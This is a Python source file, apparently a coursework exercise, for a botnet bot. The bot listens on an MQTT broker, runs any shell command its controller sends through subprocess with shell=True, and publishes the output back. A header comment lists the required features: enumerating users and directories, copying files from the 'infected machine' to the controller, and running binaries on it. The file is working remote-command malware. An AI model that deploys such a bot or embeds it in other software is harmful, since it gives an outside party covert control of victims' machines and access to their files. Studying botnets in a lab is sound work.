# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
import subprocess
import paho.mqtt.client as mqtt
from consts import *


# broker = central server that receives all messages
#          and then routes them to the correct destinations.



def on_message(client, userdata, msg):
    payload = msg.payload.decode()
    # FILTER: Only process messages meant for me
    if payload.startswith(BOT_ID + ":"):
        # Split the message to get the actual command
        # "BOT_STRE:id" -> ["BOT_STRE", "id"]
        command = payload.split(":", 1)[1]

        print(f"Executing my command: {command}")

        try:
            # Use shell=True for now so 'ls /' works easily
            result = subprocess.check_output(command, shell=True).decode()
            print(f"[SENDING COMMAND RESULT TO CONTROLLER]: {result}")
            client.publish(TOPIC, f"{BOT_ID}_RES: {result}")
        except Exception as e:
            client.publish(TOPIC, f"{BOT_ID}_ERR: {str(e)}")
    else:
        # It's someone else's traffic. Ignore it.
        pass


# both the bot and the controller are 'clients'
# client = mqtt.Client()
# added version to avoid warning
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)


# callback when a message is received
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)

print("Bot is listening...")

# prevents the script from ending.
client.loop_forever()

